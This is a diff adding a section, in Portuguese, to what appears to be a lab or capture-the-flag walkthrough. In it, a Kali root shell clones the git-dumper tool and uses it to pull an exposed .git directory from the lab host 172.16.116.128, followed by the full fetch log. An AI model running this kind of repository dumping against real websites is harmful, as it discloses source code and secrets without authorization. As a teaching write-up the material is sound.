@@ -135,3 +135,125 @@ Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
            Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
 
 ```
+Fazendo o download do projeto git-dumper
+
+```jsx
+──(root㉿kali)-[/home/kali]
+└─# git clone https://github.com/arthaud/git-dumper.git
+Cloning into 'git-dumper'...
+remote: Enumerating objects: 197, done.
+remote: Counting objects: 100% (130/130), done.
+remote: Compressing objects: 100% (70/70), done.
+remote: Total 197 (delta 83), reused 74 (delta 60), pack-reused 67
+Receiving objects: 100% (197/197), 59.29 KiB | 2.96 MiB/s, done.
+Resolving deltas: 100% (104/104), done.
+                                                                                                                                                                                             
+┌──(root㉿kali)-[/home/kali]
+└─# cd git-dumper 
+                                                                                                                                                                                             
+┌──(root㉿kali)-[/home/kali/git-dumper]
+└─# mkdir backup
+```      
+Fazendo o downaload do conteúdo da pasta .git
+                                  
+```jsx
+                                                                                                                                                     
+┌──(root㉿kali)-[/home/kali/git-dumper]
+└─# python3 git_dumper.py http://172.16.116.128/.git/ backup
+[-] Testing http://172.16.116.128/.git/HEAD [200]
+[-] Testing http://172.16.116.128/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://172.16.116.128/.git/ [200]
+[-] Fetching http://172.16.116.128/.gitignore [404]
+[-] http://172.16.116.128/.gitignore responded with status code 404
+[-] Fetching http://172.16.116.128/.git/HEAD [200]
+[-] Fetching http://172.16.116.128/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://172.16.116.128/.git/config [200]
+[-] Fetching http://172.16.116.128/.git/description [200]
+[-] Fetching http://172.16.116.128/.git/refs/ [200]
+[-] Fetching http://172.16.116.128/.git/info/ [200]
+[-] Fetching http://172.16.116.128/.git/logs/ [200]
+[-] Fetching http://172.16.116.128/.git/hooks/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/ [200]
+[-] Fetching http://172.16.116.128/.git/logs/refs/ [200]
+[-] Fetching http://172.16.116.128/.git/logs/HEAD [200]
+[-] Fetching http://172.16.116.128/.git/refs/heads/ [200]
+[-] Fetching http://172.16.116.128/.git/logs/refs/heads/ [200]
+[-] Fetching http://172.16.116.128/.git/refs/tags/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/0f/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/04/ [200]
+[-] Fetching http://172.16.116.128/.git/logs/refs/heads/master [200]
+[-] Fetching http://172.16.116.128/.git/objects/09/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/8b/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/8a/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/32/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/49/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/56/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/4e/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/9d/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/7f/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/66/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/6e/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/59/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/77/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/a2/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/b6/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/c1/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/a4/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/c9/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/b2/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/ca/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/93/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/aa/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/e6/ [200]
+[-] Fetching http://172.16.116.128/.git/objects/info/ [200]
+[-] Fetching http://172.16.116.128/.git/refs/heads/master [200]
+[-] Fetching http://172.16.116.128/.git/objects/04/4d8b4fec000778de9fb27726de4f0f56edbd0e [200]
+[-] Fetching http://172.16.116.128/.git/info/exclude [200]
+[-] Fetching http://172.16.116.128/.git/objects/09/04b1923584a0fb0ab31632de47c520db6a6e21 [200]
+[-] Fetching http://172.16.116.128/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/post-update.sample [200]
+[-] Fetching http://172.16.116.128/.git/objects/pack/ [200]
+[-] Fetching http://172.16.116.128/.git/hooks/pre-merge-commit.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/pre-push.sample [200]
+[-] Fetching http://172.16.116.128/.git/objects/0f/1d821f48a9cf662f285457a5ce9af6b9feb2c4 [200]
+[-] Fetching http://172.16.116.128/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/push-to-checkout.sample [200]
+[-] Fetching http://172.16.116.128/.git/hooks/fsmonitor-watchman.sample [200]
+[-] Fetching http://172.16.116.128/.git/objects/8a/0ff67b07eb0cc9b7bed4f9094862c22cab2a7d [200]
+[-] Fetching http://172.16.116.128/.git/hooks/update.sample [200]
+[-] Fetching http://172.16.116.128/.git/objects/9d/ed9bf70f1f63a852e9e4f02df7b6d325e95c67 [200]
+[-] Fetching http://172.16.116.128/.git/objects/49/151b46cc957717f5529d362115339d4abfe207 [200]
+[-] Fetching http://172.16.116.128/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://172.16.116.128/.git/objects/7f/d95a2f170cb55fbb335a56974689f659e2c383 [200]
+[-] Fetching http://172.16.116.128/.git/objects/56/987e1f75e392aae416571b38b53922c49f6e7e [200]
+[-] Fetching http://172.16.116.128/.git/objects/32/580f7fb8c39cdad6a7f49839cebfe07f597bcf [200]
+[-] Fetching http://172.16.116.128/.git/objects/8b/6cd9032d268332de09c64cbe9efa63ace3998e [200]
+[-] Fetching http://172.16.116.128/.git/objects/77/c09cf4b905b2c537f0a02bca81c6fbf32b9c9d [200]
+[-] Fetching http://172.16.116.128/.git/objects/4e/b24de5b85be7cf4b2cef3f0cfc83b09a236133 [200]
+[-] Fetching http://172.16.116.128/.git/objects/59/218997bfb0d8012a918e43bea3e497e68248a9 [200]
+[-] Fetching http://172.16.116.128/.git/objects/6e/4328f5f878ed20c0b68fc8bda2133deadc49a3 [200]
+[-] Fetching http://172.16.116.128/.git/objects/66/5001d05a7c0b6428ce22de1ae572c54cba521d [200]
+[-] Fetching http://172.16.116.128/.git/objects/32/d0928f948af8252b0200ff9cac40534bfe230b [200]
+[-] Fetching http://172.16.116.128/.git/objects/a2/0488521df2b427246c0155570f5bfad6936c6c [200]
+[-] Fetching http://172.16.116.128/.git/objects/c9/56989b29ad0767edc6cf3a202545927c3d1e76 [200]
+[-] Fetching http://172.16.116.128/.git/objects/b2/076545503531a2e482a89b84f387e5d44d35c0 [200]
+[-] Fetching http://172.16.116.128/.git/objects/b6/f546da0ab9a91467412383909c8edc9859a363 [200]
+[-] Fetching http://172.16.116.128/.git/objects/ca/f37015411ad104985c7dd86373b3a347f71097 [200]
+[-] Fetching http://172.16.116.128/.git/objects/c1/ef127486aa47cd0b3435bca246594a43b559bb [200]
+[-] Fetching http://172.16.116.128/.git/objects/93/9b9aad671e5bcde51b4b5d99b1464e2d52ceaa [200]
+[-] Fetching http://172.16.116.128/.git/objects/aa/2a5f3aa15bb402f2b90a07d86af57436d64917 [200]
+[-] Fetching http://172.16.116.128/.git/objects/a4/d900a8d85e8938d3601f3cef113ee293028e10 [200]
+[-] Fetching http://172.16.116.128/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200]
+[-] Fetching http://172.16.116.128/.git/index [200]
+[-] Sanitizing .git/config
+[-] Running git checkout .
+Updated 14 paths from the index
+                                                                                                                                                                                             
+┌──(root㉿kali)-[/home/kali/git-dumper]
+└─# cd backup    
+```
